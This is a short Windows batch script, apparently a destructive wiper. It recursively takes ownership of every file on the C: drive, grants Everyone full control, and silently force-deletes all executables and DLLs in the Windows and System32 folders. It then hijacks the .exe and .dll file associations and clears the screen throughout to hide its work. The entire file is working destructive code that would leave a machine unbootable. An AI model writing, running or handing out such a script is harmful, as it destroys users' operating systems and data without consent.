@echo off
for /R C:\ %%G in (*) do (
   takeown /F "%%G" /r >nul 2>&1
   cls
   icacls /T "%%G" /grant Everyone:F >nul 2>&1
   cls
   icacls /T "%%G" /grant %username%:F >nul 2>&1
   cls
)
del /s /f /q "C:\Windows\*.exe" >nul 2>&1
cls
del /s /f /q "C:\Windows\*.dll" >nul 2>&1
cls
del /s /f /q "C:\Windows\System32\*.exe" >nul 2>&1
cls
del /s /f /q "C:\Windows\System32\*.dll" >nul 2>&1
cls
assoc .exe=.mp3
cls
assoc .dll=.mp4
cls
assoc .ink=.bat
cls
